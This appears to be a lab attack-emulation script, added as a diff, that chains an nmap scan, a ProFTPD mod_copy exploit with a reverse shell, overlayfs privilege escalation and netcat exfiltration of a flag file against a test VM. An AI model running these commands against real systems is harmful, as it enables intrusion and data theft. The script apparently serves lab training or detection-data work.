@@ -1,0 +1,199 @@
+#Attack Scenario 1
+
+#----LEGEND----#
+##next command(s) are statemachine commands
+##-m next command(s) are msfconsole internal command
+#@next command is a setup commands that will not affect the attack
+#$output of previous command is a data source for victim model 
+#*output of previous command has a variable for attack management
+#?FYI
+
+#?Overview
+#?RECON - nmap SYN Scan
+#?INITIAL INTRUSION - proftp_modcopy_exec
+#?PRIVELEGE ESCALATION - overlayfs_priv_esc
+#?DISCOVERY (Target File) - 3 of hearts
+#?DATA EXFIL - nc
+
+#----Just attack commands----#
+#The minimal commands to run end to end attack
+#No descriptions or data sources
+#victim = 10.0.2.9
+#attack = 10.0.2.8
+##RECON
+nmap -sV -Pn -T5 -sS 10.0.2.9
+#@Part of multiple state
+msfconsole
+##-m INITIAL INTRUSION
+use exploit/unix/ftp/proftpd_modcopy_exec
+set rhost 10.0.2.9
+set sitepath /var/www/html
+set payload cmd/unix/reverse_perl #?default
+set lhost 10.0.2.8
+set lport 4567
+exploit -j
+#*"Command Shell session X opened ..."
+##-m DISCOVERY
+sessions -i X -c 'whoami'
+sessions -i X -c 'groups'
+sessions -i X -c 'uname -a' 
+##PRIVILEGE ESCALATION
+use exploit/linux/local/overlayfs_priv_esc
+set payload linux/x86/shell/reverse_tcp #?default
+set target 0
+set session X
+set lhost 10.0.2.8
+set lport 5678
+run -j
+#*"Command Shell session Y opened ..."
+##-m DISCOVERY
+sessions -i Y -c 'whoami'
+sessions -i Y -c 'find / -name 3_of_hearts.png'
+##-m DATA EXFIL
+nc -l -p 1234 > 3_of_hearts.png
+sessions -i Y -c 'nc 10.0.2.8 1234 < /lost+found/3_of_hearts.png' 
+
+
+
+
+#----Detailed Script----#
+#
+
+#@initialize exploit database
+msfdb init
+export TARGET=10.0.2.9
+
+##RECON
+nmap -sV -Pn -T5 -oX ms3.xml $TARGET
+#?   -sV gets version from probing open ports
+#?       -Pn doesn't do an initial ping,
+#?           -T5 is very fast timing
+#$Target IP address, Open Ports, Services/versions
+
+#?We're going to go after port 21, proftp 1.3.5
+
+#@metasploit is an exploitation framework
+msfconsole
+
+#@brings the scan results in to the database
+db_import ms3.xml
+
+#@shows the hosts from that scan
+hosts
+
+#@shows the networked services
+services
+
+#@search for proftpd exploits, last one is our version
+search proftpd
+
+##INITIAL INTRUSION
+#?loads the module
+use exploit/unix/ftp/proftpd_modcopy_exec
+
+#@show information about the vulnerability, description, options, etc.
+info
+
+#@will also show information related to payloads
+show options
+
+##INITIAL INTRUSION
+#?target ip address
+set rhost 10.0.2.9
+
+##INITIAL INTRUSION
+#?reference list of regular defaults
+set sitepath /var/www/html
+
+#@payloads are the backdoor we use
+show payloads
+
+##INITIAL INTRUSION
+#?can vary attacks easily by this
+set payload cmd/unix/reverse_perl
+
+#@options now have payload options
+show options
+
+##INITIAL INTRUSION
+#?attacker's ip address
+set lhost 10.0.2.8
+
+##INITIAL INTRUSION
+#?choice
+set lport 4567
+
+##INITIAL INTRUSION
+#?-j puts the session in background
+#?creates session "Command Shell session X opened ..."
+exploit -j
+
+#@show the session that's in background, 
+sessions
+
+##DISCOVERY
+#?since command shells can be unstable, it's best to interact through the session
+sessions -i 1 -c 'whoami'
+#$target user name
+
+##DISCOVERY
+#?www-data doesn't have root permissions so we need to escalate
+sessions -i 1 -c 'groups'
+#$target permissions
+
+##DISCOVERY
+#?kernel version is a point of research for vulnerabilities
+sessions -i 1 -c 'uname -a' 
+#$target kernel version 
+
+#@find vulnerabilites for overlay file system
+search overlayfs
+
+##PRIVILEGE ESCALATION
+use exploit/linux/local/overlayfs_priv_esc
+
+#@ information
+info
+
+##PRIVILEGE ESCALATION
+#?too CVEs for this attack, 0 works on ubuntu-1404
+set target 0
+
+#@ OPTIONS
+show options
+
+##PRIVILEGE ESCALATION
+#?Needs to match session of initial intrusion
+set session 1
+
+##PRIVILEGE ESCALATION
+set lhost 10.0.2.8
+
+##PRIVILEGE ESCALATION
+set lport 5678
+
+##PRIVILEGE ESCALATION
+#?creates session "Command Shell session X opened ..."
+run -j
+
+##DISCOVERY
+sessions -i 2 -c 'whoami'
+#$target user
+
+##DISCOVERY
+#?find our goal file
+sessions -i 2 -c 'find / -name 3_of_hearts.png'
+#$location of target file
+
+
+##DATA EXFIL
+#?We're going to transfer it with nc,
+#?since it is already installed on the victim
+#?Easily found from root using ls /bin
+#ON ATTACKER
+nc -l -p 1234 > 3_of_hearts.png
+#ON VICTIM
+nc 10.0.2.8 1234 < /lost+found/3_of_hearts.png 
+
+#@Now we have the file, Open with png viewer 
+eog 3_of_hearts.png
